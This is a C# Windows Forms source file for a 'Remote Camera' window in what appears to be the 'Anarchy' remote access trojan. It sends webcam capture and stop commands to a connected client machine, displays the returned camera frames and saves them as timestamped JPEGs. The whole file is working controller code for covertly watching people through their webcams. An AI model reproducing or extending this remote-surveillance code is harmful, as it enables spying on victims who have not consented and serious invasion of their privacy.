using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using ReaLTaiizor.Controls;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormWebcam : PoisonForm
{
    public Stopwatch sw = Stopwatch.StartNew();

    public int FPS;

    public bool SaveIt;

    private IContainer components;

    private System.Windows.Forms.Panel panel1;

    public ComboBox comboBox1;

    public PictureBox pictureBox1;

    public System.Windows.Forms.Timer timer1;

    private System.Windows.Forms.Timer timerSave;

    public Label labelWait;

    private Label label1;

    private MetroControlBox metroControlBox1;

    private HopeButton btnSave;

    private HopeButton button1;

    private CrownNumeric numericUpDown1;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    internal Clients ParentClient { get; set; }

    public string FullPath { get; set; }

    public Image GetImage { get; set; }

    public FormWebcam()
    {
        this.InitializeComponent();
    }

    private void Button1_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.button1.Tag == "play")
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
                msgPack.ForcePathObject("Command").AsString = "capture";
                msgPack.ForcePathObject("List").AsInteger = this.comboBox1.SelectedIndex;
                msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(this.numericUpDown1.Value);
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                this.button1.Tag = "stop";
                this.button1.Text = "Stop";
                this.numericUpDown1.Enabled = false;
                this.comboBox1.Enabled = false;
                this.button1.Enabled = true;
            }
            else
            {
                this.button1.Tag = "play";
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
                msgPack2.ForcePathObject("Command").AsString = "stop";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
                this.button1.Text = "Start";
                this.numericUpDown1.Enabled = true;
                this.comboBox1.Enabled = true;
                this.button1.Enabled = false;
                this.timerSave.Stop();
            }
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
            base.Close();
        }
    }

    private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
    {
        try
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                this.Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void BtnSave_Click(object sender, EventArgs e)
    {
        if (this.button1.Tag != "stop")
        {
            return;
        }
        if (this.SaveIt)
        {
            this.SaveIt = false;
            return;
        }
        try
        {
            if (!Directory.Exists(this.FullPath))
            {
                Directory.CreateDirectory(this.FullPath);
            }
            Process.Start(this.FullPath);
        }
        catch
        {
        }
        this.SaveIt = true;
    }

    private void TimerSave_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(this.FullPath))
            {
                Directory.CreateDirectory(this.FullPath);
            }
            this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
        }
        catch
        {
        }
    }

    private void FormWebcam_Load(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormWebcam));
        this.panel1 = new System.Windows.Forms.Panel();
        this.numericUpDown1 = new ReaLTaiizor.Controls.CrownNumeric();
        this.button1 = new ReaLTaiizor.Controls.HopeButton();
        this.btnSave = new ReaLTaiizor.Controls.HopeButton();
        this.label1 = new System.Windows.Forms.Label();
        this.comboBox1 = new System.Windows.Forms.ComboBox();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.timerSave = new System.Windows.Forms.Timer(this.components);
        this.labelWait = new System.Windows.Forms.Label();
        this.metroControlBox1 = new ReaLTaiizor.Controls.MetroControlBox();
        this.panel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.numericUpDown1).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.panel1.BackColor = System.Drawing.Color.Transparent;
        this.panel1.Controls.Add(this.numericUpDown1);
        this.panel1.Controls.Add(this.button1);
        this.panel1.Controls.Add(this.btnSave);
        this.panel1.Controls.Add(this.label1);
        this.panel1.Controls.Add(this.comboBox1);
        this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
        this.panel1.Location = new System.Drawing.Point(20, 60);
        this.panel1.Margin = new System.Windows.Forms.Padding(2);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(493, 27);
        this.panel1.TabIndex = 3;
        this.numericUpDown1.Location = new System.Drawing.Point(126, 5);
        this.numericUpDown1.Minimum = new decimal(new int[4] { 20, 0, 0, 0 });
        this.numericUpDown1.Name = "numericUpDown1";
        this.numericUpDown1.Size = new System.Drawing.Size(39, 20);
        this.numericUpDown1.TabIndex = 20;
        this.numericUpDown1.Value = new decimal(new int[4] { 75, 0, 0, 0 });
        this.button1.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button1.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button1.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button1.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.button1.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button1.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button1.Location = new System.Drawing.Point(4, 5);
        this.button1.Name = "button1";
        this.button1.PrimaryColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.button1.Size = new System.Drawing.Size(73, 18);
        this.button1.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button1.TabIndex = 19;
        this.button1.Text = "Start";
        this.button1.TextColor = System.Drawing.Color.White;
        this.button1.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button1.Click += new System.EventHandler(Button1_Click);
        this.btnSave.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.btnSave.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.btnSave.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnSave.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.btnSave.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.btnSave.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.btnSave.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.btnSave.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.btnSave.Location = new System.Drawing.Point(370, 5);
        this.btnSave.Name = "btnSave";
        this.btnSave.PrimaryColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.btnSave.Size = new System.Drawing.Size(119, 18);
        this.btnSave.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.btnSave.TabIndex = 18;
        this.btnSave.Text = "ScreenShot";
        this.btnSave.TextColor = System.Drawing.Color.White;
        this.btnSave.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.btnSave.Click += new System.EventHandler(BtnSave_Click);
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(91, 8);
        this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(30, 13);
        this.label1.TabIndex = 8;
        this.label1.Text = "FPS:";
        this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.comboBox1.Enabled = false;
        this.comboBox1.FormattingEnabled = true;
        this.comboBox1.Location = new System.Drawing.Point(183, 2);
        this.comboBox1.Margin = new System.Windows.Forms.Padding(2);
        this.comboBox1.Name = "comboBox1";
        this.comboBox1.Size = new System.Drawing.Size(183, 21);
        this.comboBox1.TabIndex = 6;
        this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.pictureBox1.Location = new System.Drawing.Point(20, 87);
        this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(493, 266);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox1.TabIndex = 5;
        this.pictureBox1.TabStop = false;
        this.timer1.Interval = 1000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.timerSave.Interval = 1000;
        this.timerSave.Tick += new System.EventHandler(TimerSave_Tick);
        this.labelWait.AutoSize = true;
        this.labelWait.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.labelWait.Location = new System.Drawing.Point(490, 331);
        this.labelWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.labelWait.Name = "labelWait";
        this.labelWait.Size = new System.Drawing.Size(21, 20);
        this.labelWait.TabIndex = 6;
        this.labelWait.Text = "...";
        this.metroControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.metroControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(183, 40, 40);
        this.metroControlBox1.CloseHoverForeColor = System.Drawing.Color.White;
        this.metroControlBox1.CloseNormalForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.metroControlBox1.DefaultLocation = ReaLTaiizor.Enum.Metro.LocationType.Normal;
        this.metroControlBox1.DisabledForeColor = System.Drawing.Color.DimGray;
        this.metroControlBox1.IsDerivedStyle = true;
        this.metroControlBox1.Location = new System.Drawing.Point(433, -1);
        this.metroControlBox1.MaximizeBox = false;
        this.metroControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(238, 238, 238);
        this.metroControlBox1.MaximizeHoverForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.MaximizeNormalForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.MinimizeBox = true;
        this.metroControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(238, 238, 238);
        this.metroControlBox1.MinimizeHoverForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.MinimizeNormalForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.Name = "metroControlBox1";
        this.metroControlBox1.Size = new System.Drawing.Size(100, 25);
        this.metroControlBox1.Style = ReaLTaiizor.Enum.Metro.Style.Light;
        this.metroControlBox1.StyleManager = null;
        this.metroControlBox1.TabIndex = 7;
        this.metroControlBox1.Text = "metroControlBox1";
        this.metroControlBox1.ThemeAuthor = "Taiizor";
        this.metroControlBox1.ThemeName = "MetroLight";
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        base.ClientSize = new System.Drawing.Size(533, 373);
        base.ControlBox = false;
        base.Controls.Add(this.metroControlBox1);
        base.Controls.Add(this.labelWait);
        base.Controls.Add(this.pictureBox1);
        base.Controls.Add(this.panel1);
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        base.Name = "FormWebcam";
        base.Style = ReaLTaiizor.Enum.Poison.ColorStyle.White;
        this.Text = "Remote Camera";
        base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormWebcam_FormClosed);
        base.Load += new System.EventHandler(FormWebcam_Load);
        this.panel1.ResumeLayout(false);
        this.panel1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.numericUpDown1).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}